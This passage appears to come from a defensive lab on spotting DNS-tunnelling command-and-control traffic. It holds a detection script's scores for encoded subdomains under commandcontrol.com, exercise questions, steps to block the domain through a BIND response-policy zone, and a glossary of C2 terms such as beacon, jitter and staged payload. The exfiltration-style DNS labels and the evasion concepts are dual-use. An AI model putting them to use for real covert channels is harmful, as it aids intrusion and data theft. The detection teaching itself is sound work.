   - a2tMe8MeejkwkdiffA1gHD853TpbvHUKyEkGW7WzXzez7KaFYjJR4kPpBq4VSf2.tRn88TFGzym9i3HcQNReGLvUwLG57TmKrZQSEKTjno1YEz3hqqEX44d2ukXHBu6.eCGiTLePLctSYfJHA.s.commandcontrol.com.
   - 6Ngv85FEMSXAyihNWDN5VbD.s.commandcontrol.com.
   - 6Ngv85FEMSXAr18A5SamxMu.s.commandcontrol.com.
   - 6Ngv85FEMSXb4ucFTqqEgdq.s.commandcontrol.com.
Averaged indicators (* is flagged, average value (global average value) :
   entropy: 4.8327 (3.0721)*
   non_letter_ratio: 0.1229 (0.0248)
   hex_char_ratio: 0.2478 (0.3017)
   vowel_ratio: 0.1852 (0.3348)*
   n_gram_2: 10.9626 (20.9079)
   n_gram_3: 7.9124 (9.8561)
   gini_index: 0.9555 (0.8627)*
   classification_error: 0.9133 (0.7978)*
   number_of_labels: 4.6986 (2.2024)*
   average_interval: 0.0712 (1.5459)*
   payload_size: 91.9863 (17.9644)*
------------------------------
========================================
SLD: adblockplus.org.
Score: 4.50 (Threshold: 4.5)
Number of flagged domains: 1
FQDNs under this SLD:
   - adblockplus.org.
Averaged indicators (* is flagged, average value (global average value) :
   entropy: 3.5216 (3.0721)
   non_letter_ratio: 0.0000 (0.0248)
   hex_char_ratio: 0.2857 (0.3017)
   vowel_ratio: 0.2857 (0.3348)*
   n_gram_2: 0.0000 (20.9079)*
   n_gram_3: 0.0000 (9.8561)
   gini_index: 0.9082 (0.8627)*
   classification_error: 0.8571 (0.7978)*
   number_of_labels: 2.0000 (2.2024)
   average_interval: 0.0000 (1.5459)*
   payload_size: 16.0000 (17.9644)
------------------------------
```



What is the domain used for the c2 server based on the logs ?

Read the script and modify the weight / threshold to remove the false positive. What did you modify at the end ?



## RPZ 

Add the domain into the RPZ (/etc/bind/rpz.zone)

Reload (rndc reload)

Retest the client implant. It should be blocked now if the configuration is done properly.





# Some C2 Basics

There is some common language used when it comes to operating or using a C2  framework, regardless of which one you choose here's a quick rundown on  some terms you might come across.

**Implant** — This is a very generic term used to describe the piece of software  that helps maintain access to a target system, it’s pretty much acts  like an agent.

**Beacon** — Can be interpreted as a pattern of communication between a target  system and our C2 server, a target endpoint will periodically reach out  to the C2 server to “check-in” and process any tasks issued from the  server, the beaconing interval is normally randomised for  evasion/stealth purposes.

**Jitter** — Normally refers to the random delay (sometimes in seconds or minutes) between beaconing intervals, pretty much just the random delay between  the implant/agent reaching out to the C2 server.

**Staged Payload** — Of course the term payload refers to a piece of code we want to  execute on a target system, the staged part of this term refers to a  small piece of code that will later load a bigger piece of code (the  payload).

If you have a large payload to execute on a target system it could set off alarm bells at a network or system level, or it might just be really  complex or use a lot of bandwidth to execute outright, so staging this  payload essentially breaks it up into different “stages” e.g. Stage0  loads => Stage1 loads => Stage2 etc.

**BOF** — Stands for Beacon Object File, is generally custom code that can be  written by a C2 operator that can interact and use the C2 beacon API’s,  it allows for the ability of adding custom functionality and extending  the capabilities of whichever C2 you choose to use if it allows custom  BOF’s.

**Communications** — When it comes to C2 servers, communication between the implant and  server is of course vital but what’s also just as important is their  methods of communication, it needs to be reliable and covert, you’ll see a number of C2 servers communicate over DNS, HTTPS, mTLS and in some  cases even more obscure protocols.

In some cases a C2 framework can even use third-party services like Discord, Slack or even Twitter as methods of communication.
